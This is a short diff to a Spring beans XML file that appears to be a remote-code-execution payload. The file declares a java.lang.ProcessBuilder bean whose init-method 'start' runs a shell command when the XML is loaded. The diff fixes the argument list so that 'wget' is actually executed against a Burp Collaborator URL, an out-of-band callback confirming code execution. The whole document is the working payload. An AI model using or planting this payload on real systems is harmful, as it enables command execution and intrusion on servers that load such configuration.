@@ -1,9 +1,10 @@
 <beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
-  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
-    <constructor-arg>
-      <list>
-        <value>wget http://qsmikzltvdaasghyxsqu4nl7uy0soh.burpcollaborator.net</value>
-      </list>
-    </constructor-arg>
-  </bean>
+    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
+        <constructor-arg>
+            <list>
+                <value>wget</value>
+                <value>https://aycjt7zpxmqs0y0cxcsutlb2ftlkk89.burpcollaborator.net</value>
+            </list>
+        </constructor-arg>
+    </bean>
 </beans>
